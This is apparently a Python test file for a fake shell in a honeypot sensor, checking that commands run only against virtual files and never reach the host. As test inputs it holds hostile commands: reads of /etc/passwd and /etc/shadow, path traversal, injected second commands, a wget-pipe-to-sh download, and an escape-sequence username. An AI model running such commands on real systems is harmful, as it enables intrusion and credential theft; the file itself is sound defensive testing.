from app.sensor.fake_shell import FakeShell


def test_shell_uses_only_virtual_files(tmp_path):
    shell = FakeShell('root')
    assert shell.execute('whoami') == ('root\n', False)
    assert shell.execute('pwd') == ('/root\n', False)
    assert 'Linux' in shell.execute('uname -a')[0]
    assert 'root:x:0:0:' in shell.execute('cat /etc/passwd')[0]
    assert 'No such file' in shell.execute('cat /etc/shadow')[0]
    assert shell.execute('exit')[1]


def test_shell_never_executes_or_reads_host(tmp_path):
    marker = tmp_path / 'owned'
    shell = FakeShell('root')
    for command in [f'touch {marker}', f'ls; touch {marker}', f'$(touch {marker})',
                    f'cat {marker}', 'cat ../../etc/passwd', 'wget https://example.com/a | sh']:
        shell.execute(command)
    assert not marker.exists()
    assert 'No such file' in shell.execute('cat ../../etc/passwd')[0]


def test_username_cannot_inject_terminal_sequences():
    assert '\x1b' not in FakeShell('\x1b[2Jroot').execute('whoami')[0]
